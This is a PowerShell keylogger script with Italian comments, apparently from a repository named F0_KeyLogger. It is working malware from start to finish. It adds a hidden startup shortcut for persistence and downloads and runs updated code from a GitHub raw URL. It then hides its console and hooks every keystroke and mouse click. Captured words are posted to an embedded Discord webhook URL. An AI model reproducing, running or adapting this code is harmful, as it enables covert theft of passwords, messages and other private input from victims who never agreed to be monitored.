# --- Configurazione ---
$webhookUrl    = "https://discord.com/api/webhooks/1363942155105865909/xfuFLDF6gBZ62O9ij5vh-FH4BnCqdl5lZLCYvmqvwsmH7fcHh34kqFxmhigqiWVUyBiT"
$scriptPath    = $MyInvocation.MyCommand.Definition
$startupFolder = [Environment]::GetFolderPath("Startup")
$shortcutPath  = Join-Path $startupFolder "k.lnk"
$scriptUrl     = "https://raw.githubusercontent.com/UnsavorySpirit/F0_KeyLogger/main/k.ps1"

function Create-StartupShortcut {
    if (-not (Test-Path $shortcutPath)) {
        $shell    = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath       = "powershell.exe"
        $shortcut.Arguments        = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
        $shortcut.WorkingDirectory = Split-Path $scriptPath
        $shortcut.Save()
    }
}
Create-StartupShortcut

# --- Autoupdate ---
try {
    $remoteCode = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing
    if ($remoteCode.StatusCode -eq 200) {
        $currentHash = Get-FileHash -Path $scriptPath -Algorithm SHA256
        $remoteHash  = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($remoteCode.Content))).Replace("-", "")
        if ($currentHash.Hash -ne $remoteHash) {
            $remoteCode.Content | Out-File -Encoding UTF8 -FilePath $scriptPath -Force
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
            exit
        }
    }
} catch {}

# --- Nascondi la console ---
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    public const int SW_HIDE = 0;
}
"@
[Win]::ShowWindow([Win]::GetConsoleWindow(), [Win]::SW_HIDE)

# --- Definizione GlobalListener con hook tastiera e mouse ---
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class GlobalListener {
    private const int WH_KEYBOARD_LL = 13;
    private const int WH_MOUSE_LL    = 14;
    private const int WM_KEYDOWN     = 0x0100;
    private const int WM_LBUTTONDOWN = 0x0201;

    private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelProc _keyboardProc = KeyboardCallback;
    private static LowLevelProc _mouseProc    = MouseCallback;
    private static IntPtr _kbdHookID = IntPtr.Zero;
    private static IntPtr _mouseHookID = IntPtr.Zero;

    private static StringBuilder _buffer = new StringBuilder(100);
    public static Action<string> Callback;

    [DllImport("user32.dll", SetLastError=true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")]
    private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    public static void Start() {
        using (Process cur = Process.GetCurrentProcess())
        using (ProcessModule mod = cur.MainModule) {
            IntPtr hMod = GetModuleHandle(mod.ModuleName);
            _kbdHookID = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, hMod, 0);
            _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, _mouseProc, hMod, 0);
        }
    }

    public static void Stop() {
        UnhookWindowsHookEx(_kbdHookID);
        UnhookWindowsHookEx(_mouseHookID);
    }

    private static IntPtr KeyboardCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vk = Marshal.ReadInt32(lParam);
            byte[] state = new byte[256];
            GetKeyboardState(state);
            uint scan = MapVirtualKey((uint)vk, 0);
            StringBuilder sb = new StringBuilder(2);
            int len = ToUnicode((uint)vk, scan, state, sb, sb.Capacity, 0);
            char c = len > 0 ? sb[0] : '\0';

            if (c != '\0') _buffer.Append(c);
            else if (vk == (int)Keys.Space || vk == (int)Keys.Enter) {
                _buffer.Append(vk == (int)Keys.Space ? ' ' : '\n');
                FlushBuffer();
            }
            if (vk == (int)Keys.Escape) { Stop(); Application.Exit(); }
        }
        return CallNextHookEx(_kbdHookID, nCode, wParam, lParam);
    }

    private static IntPtr MouseCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_LBUTTONDOWN) {
            FlushBuffer();
        }
        return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
    }

    private static void FlushBuffer() {
        if (_buffer.Length > 0 && Callback != null) {
            Callback(_buffer.ToString());
            _buffer.Clear();
        }
    }
}
"@ -ReferencedAssemblies "System.Windows.Forms.dll"

# --- Callback PowerShell: invia parola al webhook ---
[GlobalListener]::Callback = [System.Action[string]]{
    param($msg)
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{ content = $msg } | ConvertTo-Json) -ContentType 'application/json'
    } catch {}
}

# --- Avvio dei hook invisibili ---
[GlobalListener]::Start()
[System.Windows.Forms.Application]::Run()

